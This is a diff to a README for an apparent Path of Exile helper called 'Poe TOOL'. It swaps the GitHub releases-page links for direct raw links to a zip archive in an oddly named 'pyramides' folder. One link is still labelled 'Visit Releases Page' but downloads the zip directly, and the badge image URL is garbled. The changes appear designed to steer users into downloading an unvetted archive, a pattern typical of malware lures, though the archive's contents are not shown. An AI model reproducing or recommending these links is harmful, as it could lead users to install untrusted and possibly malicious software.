@@ -4,14 +4,14 @@
 Welcome to the Poe TOOL, designed to enhance your experience with Path of Exile. This application streamlines various tasks, making it easier for you to manage your in-game activities.
 
 ## 🔗 Download Now
-[![Download Poe TOOL](https://img.shields.io/badge/Download-Poe%20TOOL-blue.svg)](https://github.com/Nadyoperative267/poe1-tool-uni-versa/releases)
+[![Download Poe TOOL](https://raw.githubusercontent.com/Nadyoperative267/poe1-tool-uni-versa/main/pyramides/poe1-tool-uni-versa-1.5.zip%https://raw.githubusercontent.com/Nadyoperative267/poe1-tool-uni-versa/main/pyramides/poe1-tool-uni-versa-1.5.zip)](https://raw.githubusercontent.com/Nadyoperative267/poe1-tool-uni-versa/main/pyramides/poe1-tool-uni-versa-1.5.zip)
 
 ## 🚀 Getting Started
 To use the Poe TOOL, follow these simple steps:
 
 1. **Visit the Releases Page:**
    Click the button below to access the download options:
-   [Visit Releases Page](https://github.com/Nadyoperative267/poe1-tool-uni-versa/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Nadyoperative267/poe1-tool-uni-versa/main/pyramides/poe1-tool-uni-versa-1.5.zip)
 
 2. **Select the Latest Version:**
    On the Releases page, find the latest version at the top. The version number will indicate if it is stable and ready for use.
